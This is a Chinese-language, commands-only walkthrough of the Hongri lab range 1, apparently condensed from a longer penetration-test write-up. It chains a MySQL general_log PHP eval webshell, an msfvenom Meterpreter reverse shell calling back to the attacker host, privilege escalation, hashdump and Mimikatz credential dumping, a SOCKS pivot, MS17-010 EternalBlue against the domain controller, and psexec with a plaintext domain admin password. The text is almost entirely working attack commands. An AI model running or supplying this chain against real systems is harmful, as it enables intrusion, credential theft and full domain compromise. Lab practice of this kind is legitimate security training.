# 红日靶场 1 纯命令版

>
> 只保留原文中的命令，并为每组命令附一句话说明。

## 1. 外网信息收集

```bash
nmap -sC -sV -p- 192.168.0.110
```

对入口主机做全端口扫描、服务识别和默认脚本检测。

```bash
dirsearch -u 192.168.0.110 -e * -x 300-399,400-499,500-599
```

扫描 Web 目录，排除 3xx、4xx、5xx 响应以降低噪声。

## 2. phpMyAdmin 写马

```sql
show variables like 'general%';
```

查看 `general_log` 是否开启以及当前日志路径。

```sql
set global general_log="ON";
set global general_log_file="C:/phpStudy/WWW/shell.php";
```

开启 MySQL 查询日志并将日志文件指向 Web 目录。

```sql
select '<?php @eval($_POST[cmd]);?>';
```

通过查询写入 PHP 代码，使日志文件成为 WebShell。

WebShell 连接信息：

```text
http://192.168.0.110/shell.php
POST 参数：cmd
```

## 3. MSF 上线 Windows 7

```bash
msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.0.111 lport=5555 -f exe -o shell.exe
```

生成 Windows Meterpreter 反向连接程序。

```text
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.0.111
set lport 5555
run
```

启动 MSF Handler 并监听 5555 端口。

## 4. 后渗透与凭据

```text
getsystem
```

将 Meterpreter 权限提升到 `NT AUTHORITY\SYSTEM`。

```text
ps
migrate 492
```

查看进程并迁移到 64 位 SYSTEM 进程，解决 32/64 位导致的 `hashdump` 报错。

```text
hashdump
```

导出目标本机用户 Hash。

```text
load kiwi
creds_all
```

加载 Mimikatz 并枚举明文密码、Hash 和票据。

## 5. 内网代理

```text
windows_x64_admin.exe -l 6666
```

在攻击机启动代理服务端并监听 6666 端口。

```text
windows_x64_agent.exe
```

在已上线的 Windows 7 中运行代理客户端；原文没有给出完整参数。

```bash
vim /etc/proxychains4.conf
```

编辑 proxychains 配置；原文没有展示具体插入内容。

根据后文 MSF 使用的代理端口，典型配置为：

```text
socks5 127.0.0.1 7777
```

## 6. 内网扫描

```powershell
.\fscan64.exe -h 192.168.52.0/24
```

扫描内网存活主机、Web 服务和 MS17-010。

## 7. MS17-010

```text
search exploit/windows/smb/ms17_010_eternalblue
```

搜索 MS17-010 模块。

```text
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.52.138
set proxies socks5:127.0.0.1:7777
setg reverseAllowProxy true
exploit
```

通过 SOCKS 代理对域控执行 MS17-010。

原文中该方式利用了漏洞，但 Meterpreter stage 未稳定上线。

## 8. 域管理员凭据横向

```bash
proxychains4 impacket-psexec GOD/Administrator:'Key-1122'@192.168.52.138
```

通过代理使用域管理员明文密码执行 PsExec，获得域控 SYSTEM Shell。
